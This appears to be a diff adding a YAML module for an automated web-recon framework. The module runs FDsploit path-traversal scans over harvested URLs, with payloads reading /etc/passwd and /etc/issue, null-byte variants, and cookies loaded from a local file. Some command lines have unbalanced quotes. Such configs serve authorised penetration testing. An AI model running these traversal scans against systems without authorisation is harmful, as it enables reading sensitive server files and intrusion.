@@ -1,0 +1,35 @@
+name: pathtraversal
+desc: Run fdploit scan with HTTP data
+
+report:
+  final:
+    - "{{Output}}/vuln/pathtraversal/{{Workspace}}-pathtraversal.csv"
+
+params:  
+  - sqlurlsFile: "{{Output}}/linkfinding/sqlurls-{{Workspace}}.txt"
+  - sqlResultFile: "{{Output}}/vuln/pathtraversal/{{Workspace}}-pathtraversal.csv"
+  - pathtraversalTimeout: "6h"
+  - header: "true"
+  - out: "{{Output}}/vuln"
+
+pre_run:
+  - ExecCmd("touch {{sqlResultFile}}")
+
+steps:
+  # pathtraversal scan
+  - required:  
+      - "/home/quyen/tools/FDsploit/fdsploit.py"  #tool nayf gaf vc
+    conditions:  
+      - '"{{header}}" == ""'
+    commands: # theem wordlist path 
+      - "timeout -k 1m {{pathtraversalTimeout}} python3 /home/quyen/tools/FDsploit/fdsploit.py -f {{sqlurlsFile}} -p /etc/passwd -d 8 -k 'root' >> {{sqlResultFile}} "
+      # khong nhầm là nếu có 1 url k hợp lệ nó dừng luôn quá trình :>
+      - "timeout -k 1m {{pathtraversalTimeout}} python3 /home/quyen/tools/FDsploit/fdsploit.py -f {{sqlurlsFile}} -p /etc/passwd -d 8 -t %00 -k 'root' >> {{sqlResultFile}}"
+      - "timeout -k 1m {{pathtraversalTimeout}} python3 /home/quyen/tools/FDsploit/fdsploit.py -f {{sqlurlsFile}} -p /etc/issue -d 8 -k 'root' >> {{sqlResultFile}}"
+
+  - conditions:  
+      - '"{{header}}" == "true"'
+    commands:
+      - timeout -k 1m {{pathtraversalTimeout}} python3 /home/quyen/tools/FDsploit/fdsploit.py -f {{sqlurlsFile}} -p /etc/passwd -d 8 -c \"$(cat /home/quyen/tools/cookies.txt)\" -k 'root' >> {{sqlResultFile}} "
+      - timeout -k 1m {{pathtraversalTimeout}} python3 /home/quyen/tools/FDsploit/fdsploit.py -f {{sqlurlsFile}} -p /etc/passwd -d 8 -t %00 -c \"$(cat /home/quyen/tools/cookies.txt)\" -k 'root' >> {{sqlResultFile}}"
+      - timeout -k 1m {{pathtraversalTimeout}} python3 /home/quyen/tools/FDsploit/fdsploit.py -f {{sqlurlsFile}} -p /etc/issue -d 8 -c \"$(cat /home/quyen/tools/cookies.txt)\" -k 'root' >> {{sqlResultFile}}"
